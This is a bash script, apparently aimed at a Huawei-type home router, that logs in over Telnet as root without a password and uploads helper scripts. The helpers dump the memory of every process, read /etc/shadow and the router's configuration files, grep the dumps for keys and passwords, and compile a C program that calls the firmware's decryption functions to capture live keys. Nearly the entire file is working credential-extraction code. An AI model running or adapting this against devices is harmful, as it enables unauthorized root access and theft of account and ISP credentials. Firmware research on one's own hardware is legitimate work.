#!/bin/bash

# Root Memory Extraction Script
# Connects via Telnet with root access and dumps all process memory for key extraction

ROUTER_IP="192.168.1.1"
ROOT_USER="root"
OUTPUT_DIR="/home/recep/Masaüstü/Firmware/root_memory_extraction"

echo "=== Root Memory Extraction ==="
echo "Router: $ROUTER_IP"
echo "Output: $OUTPUT_DIR"
echo

# Create output directory
mkdir -p "$OUTPUT_DIR"/{processes,memory_dumps,configs,keys}

# Function to execute Telnet command as root
telnet_root_exec() {
    local cmd="$1"
    local timeout="${2:-60}"
    
    {
        sleep 2
        echo "root"
        sleep 2
        echo "$cmd"
        sleep 5
        echo "exit"
    } | timeout "$timeout" telnet "$ROUTER_IP" 2>/dev/null
}

# Test root connection
echo "[*] Testing root Telnet connection..."
test_result=$(telnet_root_exec "echo 'ROOT_CONNECTION_TEST'" 15)
if echo "$test_result" | grep -q "ROOT_CONNECTION_TEST"; then
    echo "[+] Root Telnet connection successful!"
else
    echo "[-] Root connection failed. Trying alternative ports..."
    
    # Try port 2323 (alternative from forum method)
    test_result=$(timeout 15 telnet "$ROUTER_IP" 2323 << 'EOF'
root
echo 'ROOT_CONNECTION_TEST'
exit
EOF 2>/dev/null)
    
    if echo "$test_result" | grep -q "ROOT_CONNECTION_TEST"; then
        echo "[+] Root connection successful on port 2323!"
        ROUTER_PORT="2323"
    else
        echo "[-] Root connection failed on both ports"
        exit 1
    fi
fi

# 1. Get complete process list with root privileges
echo "[*] Getting complete process list..."
telnet_root_exec "ps aux" > "$OUTPUT_DIR/processes/all_processes.txt"
telnet_root_exec "ps -ef" > "$OUTPUT_DIR/processes/all_processes_extended.txt"

# Find crypto-related processes
echo "[*] Finding crypto processes..."
telnet_root_exec "ps aux | grep -E 'smp|crypto|cipher|decrypt|encrypt|capi|hw_'" > "$OUTPUT_DIR/processes/crypto_processes.txt"

# Get PIDs of all processes for memory dumping
echo "[*] Getting all process PIDs..."
telnet_root_exec "ls /proc | grep -E '^[0-9]+$'" > "$OUTPUT_DIR/processes/all_pids.txt"

# 2. Dump memory from ALL processes
echo "[*] Starting comprehensive memory dump..."

# Create memory dump script on router
memory_dump_script='
#!/bin/sh
echo "=== Starting Memory Dump ==="
echo "Timestamp: $(date)"
echo

# Create output directory
mkdir -p /tmp/memory_dumps

# Function to dump process memory
dump_process_memory() {
    local pid=$1
    local cmdline=$2
    
    if [ -z "$pid" ] || [ ! -d "/proc/$pid" ]; then
        return
    fi
    
    echo "[*] Dumping PID $pid: $cmdline"
    
    # Get process info
    echo "PID: $pid" > "/tmp/memory_dumps/info_$pid.txt"
    echo "Cmdline: $cmdline" >> "/tmp/memory_dumps/info_$pid.txt"
    cat "/proc/$pid/status" >> "/tmp/memory_dumps/info_$pid.txt" 2>/dev/null
    echo "---" >> "/tmp/memory_dumps/info_$pid.txt"
    
    # Get memory maps
    cat "/proc/$pid/maps" >> "/tmp/memory_dumps/maps_$pid.txt" 2>/dev/null
    
    # Try to dump memory
    if [ -r "/proc/$pid/mem" ]; then
        echo "Memory readable, dumping..."
        
        # Dump different memory regions
        for offset in 0x1000 0x10000 0x100000 0x1000000 0x10000000; do
            echo "Dumping from offset $offset..." >> "/tmp/memory_dumps/dump_$pid.txt"
            dd if="/proc/$pid/mem" bs=1 skip=$((offset)) count=1048576 2>/dev/null | \
                strings -n 16 | head -50 >> "/tmp/memory_dumps/dump_$pid.txt"
            echo "---" >> "/tmp/memory_dumps/dump_$pid.txt"
        done
        
        # Also dump heap/stack if identifiable
        grep -E "heap|stack" "/proc/$pid/maps" | while read line; do
            addr_range=$(echo "$line" | awk "{print \$1}")
            if [ -n "$addr_range" ]; then
                echo "Dumping $addr_range..." >> "/tmp/memory_dumps/heapstack_$pid.txt"
                start_addr=$(echo "$addr_range" | cut -d"-" -f1)
                size=$((0x$(echo "$addr_range" | cut -d"-" -f2) - 0x$start_addr))
                if [ $size -gt 0 ] && [ $size -lt 1048576 ]; then
                    dd if="/proc/$pid/mem" bs=1 skip=$((0x$start_addr)) count=$size 2>/dev/null | \
                        strings -n 16 | head -30 >> "/tmp/memory_dumps/heapstack_$pid.txt"
                fi
                echo "---" >> "/tmp/memory_dumps/heapstack_$pid.txt"
            fi
        done
        
    else
        echo "Memory not readable for PID $pid" >> "/tmp/memory_dumps/info_$pid.txt"
    fi
}

# Get all processes and dump their memory
for pid in $(ls /proc | grep -E "^[0-9]+$"); do
    if [ -f "/proc/$pid/cmdline" ]; then
        cmdline=$(cat "/proc/$pid/cmdline" | tr "\0" " ")
        dump_process_memory "$pid" "$cmdline"
    fi
done

echo "Memory dump completed!"
echo "Files created in /tmp/memory_dumps/"
ls -la /tmp/memory_dumps/
'

# Upload and execute memory dump script
echo "[*] Uploading memory dump script..."
telnet_root_exec "cat > /tmp/memory_dump.sh << 'ENDOFFILE'
$memory_dump_script
ENDOFFILE"

telnet_root_exec "chmod +x /tmp/memory_dump.sh"

echo "[*] Executing memory dump script..."
telnet_root_exec "/tmp/memory_dump.sh" 300

# 3. Download all memory dumps
echo "[*] Downloading memory dumps..."

# Get list of dumped files
dump_files=$(telnet_root_exec "ls -la /tmp/memory_dumps/")

echo "$dump_files" | while read line; do
    if echo "$line" | grep -q "dump_\|info_\|maps_\|heapstack_"; then
        filename=$(echo "$line" | awk '{print $9}')
        if [ -n "$filename" ]; then
            echo "[*] Downloading $filename"
            telnet_root_exec "cat /tmp/memory_dumps/$filename" > "$OUTPUT_DIR/memory_dumps/$filename"
        fi
    fi
done

# 4. Extract encryption keys from memory dumps
echo "[*] Extracting encryption keys from memory dumps..."

# Key extraction script
key_extraction_script='
#!/bin/sh
echo "=== Key Extraction from Memory Dumps ==="

# Search for potential encryption keys in all dump files
for file in /tmp/memory_dumps/dump_*.txt; do
    if [ -f "$file" ]; then
        echo "Searching in $(basename $file)..."
        
        # Look for hex keys (32+ chars)
        grep -E "[0-9a-fA-F]{32,}" "$file" | head -10
        
        # Look for Base64 keys
        grep -E "[A-Za-z0-9+/]{32,}={0,2}" "$file" | head -10
        
        # Look for key patterns
        grep -iE "key[=:].{16,}|password[=:].{16,}|secret[=:].{16,}" "$file" | head -10
        
        echo "---"
    fi
done

# Also search in heap/stack dumps
for file in /tmp/memory_dumps/heapstack_*.txt; do
    if [ -f "$file" ]; then
        echo "Searching in heap/stack $(basename $file)..."
        grep -E "[0-9a-fA-F]{32,}|[A-Za-z0-9+/]{32,}={0,2}" "$file" | head -5
        echo "---"
    fi
done
'

# Upload and execute key extraction
telnet_root_exec "cat > /tmp/extract_keys.sh << 'ENDOFFILE'
$key_extraction_script
ENDOFFILE"

telnet_root_exec "chmod +x /tmp/extract_keys.sh"
telnet_root_exec "/tmp/extract_keys.sh" > "$OUTPUT_DIR/keys/memory_keys.txt"

# 5. Get system configuration files
echo "[*] Extracting configuration files..."

config_commands=(
    "cat /etc/passwd"
    "cat /etc/shadow"
    "cat /etc/config/*"
    "cat /tmp/config/*"
    "find /etc -name '*.conf' -exec cat {} \;"
    "find /tmp -name '*.conf' -exec cat {} \;"
    "cat /mnt/jffs2/hw_ctree.xml"
    "cat /var/hw_ctree_equipbak.xml"
    "uci show"
    "env"
)

for i in "${!config_commands[@]}"; do
    cmd="${config_commands[$i]}"
    echo "[*] Getting config $((i+1))/${#config_commands[@]}"
    telnet_root_exec "$cmd" > "$OUTPUT_DIR/configs/config_$((i+1)).txt"
done

# 6. Trigger crypto operations and capture live keys
echo "[*] Triggering crypto operations..."

crypto_trigger_script='
#!/bin/sh
echo "=== Triggering Crypto Operations ==="

# Create crypto test program
cat > /tmp/live_crypto_test.c << "EOFC"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>

int HW_Mobilemng_SetTaskSource() { return 0; }
int SRV_COMM_GetNewExportType() { return 0; }
void* SRV_COMM_GetExportValue() { return NULL; }
void* CAPI_SMP_GetWanInterfaceStatus() { return NULL; }

int main() {
    void *handle;
    int (*decrypt_func)(const char*, char*);
    char output[1024];
    
    printf("=== Live Crypto Test ===\\n");
    
    // Test with various inputs to generate keys
    const char* test_inputs[] = {
        "admin", "superonline", "password", "test123",
        "huawei", "default", "root", "telecomadmin",
        "123456", "config", "keytest", "secret123"
    };
    
    // Test primary function
    handle = dlopen("/lib/libhw_smp_capi.so", RTLD_LAZY);
    if (handle) {
        decrypt_func = dlsym(handle, "CAPI_SMP_DecryptCipherText");
        if (decrypt_func) {
            printf("Testing CAPI_SMP_DecryptCipherText...\\n");
            for (int i = 0; i < 12; i++) {
                memset(output, 0, sizeof(output));
                int result = decrypt_func(test_inputs[i], output);
                printf("Input: %-15s -> Result: %d, Output: \\"%s\\"\\n", 
                       test_inputs[i], result, output);
                
                // Print memory location of output (potential key location)
                printf("Output buffer address: %p\\n", (void*)output);
            }
        }
        dlclose(handle);
    }
    
    // Test fallback function
    handle = dlopen("/lib/libl3_base_api.so", RTLD_LAZY);
    if (handle) {
        decrypt_func = dlsym(handle, "WAN_IF_DecryptPPPoEPassWord");
        if (decrypt_func) {
            printf("\\nTesting WAN_IF_DecryptPPPoEPassWord...\\n");
            for (int i = 0; i < 8; i++) {
                memset(output, 0, sizeof(output));
                int result = decrypt_func(test_inputs[i], output);
                printf("Input: %-15s -> Result: %d, Output: \\"%s\\"\\n", 
                       test_inputs[i], result, output);
            }
        }
        dlclose(handle);
    }
    
    return 0;
}
EOFC

# Compile and run
gcc -o /tmp/live_crypto_test /tmp/live_crypto_test.c -ldl 2>/dev/null
if [ -f /tmp/live_crypto_test ]; then
    echo "Crypto test compiled successfully"
    /tmp/live_crypto_test &
    CRYPTO_PID=$!
    echo "Crypto test PID: $CRYPTO_PID"
    
    # Monitor and dump memory while running
    sleep 2
    if [ -r "/proc/$CRYPTO_PID/mem" ]; then
        echo "Dumping crypto process memory..."
        dd if="/proc/$CRYPTO_PID/mem" bs=4096 count=200 2>/dev/null | \
            strings -n 32 > /tmp/live_crypto_keys.txt
        
        echo "Live crypto keys:"
        cat /tmp/live_crypto_keys.txt
    fi
    
    kill $CRYPTO_PID 2>/dev/null
    rm -f /tmp/live_crypto_test /tmp/live_crypto_test.c /tmp/live_crypto_keys.txt
else
    echo "Failed to compile crypto test"
fi
'

# Upload and execute crypto trigger
telnet_root_exec "cat > /tmp/trigger_crypto.sh << 'ENDOFFILE'
$crypto_trigger_script
ENDOFFILE"

telnet_root_exec "chmod +x /tmp/trigger_crypto.sh"
telnet_root_exec "/tmp/trigger_crypto.sh" > "$OUTPUT_DIR/keys/live_crypto_keys.txt"

# 7. Create comprehensive summary
echo "[*] Creating extraction summary..."

cat > "$OUTPUT_DIR/extraction_summary.txt" << EOF
=== Root Memory Extraction Summary ===
Date: $(date)
Router IP: $ROUTER_IP
Root Access: Yes

=== Files Extracted ===

Process Information:
- all_processes.txt: Complete process list
- all_processes_extended.txt: Extended process information
- crypto_processes.txt: Crypto-related processes
- all_pids.txt: All process PIDs

Memory Dumps:
- dump_*.txt: Memory dumps from all processes
- info_*.txt: Process information
- maps_*.txt: Memory maps
- heapstack_*.txt: Heap and stack dumps

Configuration Files:
- config_*.txt: Various configuration files
- Passwords and keys from configuration

Keys Found:
- memory_keys.txt: Keys extracted from memory dumps
- live_crypto_keys.txt: Keys from live crypto operations

=== Analysis Commands ===

To search for encryption keys:
grep -rE "[0-9a-fA-F]{32,}" memory_dumps/
grep -rE "[A-Za-z0-9+/]{32,}=" memory_dumps/
grep -riE "key|password|secret" memory_dumps/

To analyze crypto processes:
grep -E "smp|crypto|cipher" processes/all_processes.txt

To find configuration passwords:
grep -riE "password|key|secret" configs/

=== Next Steps ===

1. Review memory_keys.txt for encryption keys
2. Analyze live_crypto_keys.txt for runtime keys
3. Check configuration files for encrypted passwords
4. Test extracted keys with decryption functions
5. Document complete key extraction process

EOF

echo
echo "[+] Root memory extraction completed!"
echo "[*] Results saved to: $OUTPUT_DIR"
echo "[*] Summary: $OUTPUT_DIR/extraction_summary.txt"

# Show quick findings
echo
echo "=== Quick Findings ==="
echo "Memory dumps created: $(ls -1 "$OUTPUT_DIR/memory_dumps" | wc -l)"
echo "Configuration files: $(ls -1 "$OUTPUT_DIR/configs" | wc -l)"
echo "Key files created: $(ls -1 "$OUTPUT_DIR/keys" | wc -l)"

# Look for immediate key findings
if [ -f "$OUTPUT_DIR/keys/memory_keys.txt" ]; then
    key_count=$(grep -cE "[0-9a-fA-F]{32,}|[A-Za-z0-9+/]{32,}=" "$OUTPUT_DIR/keys/memory_keys.txt" 2>/dev/null || echo "0")
    echo "Potential keys found in memory: $key_count"
fi

if [ -f "$OUTPUT_DIR/keys/live_crypto_keys.txt" ]; then
    key_count=$(grep -cE "[0-9a-fA-F]{32,}|[A-Za-z0-9+/]{32,}=" "$OUTPUT_DIR/keys/live_crypto_keys.txt" 2>/dev/null || echo "0")
    echo "Potential keys found in live crypto: $key_count"
fi

echo
echo "Extraction complete. Review files in $OUTPUT_DIR for detailed analysis."
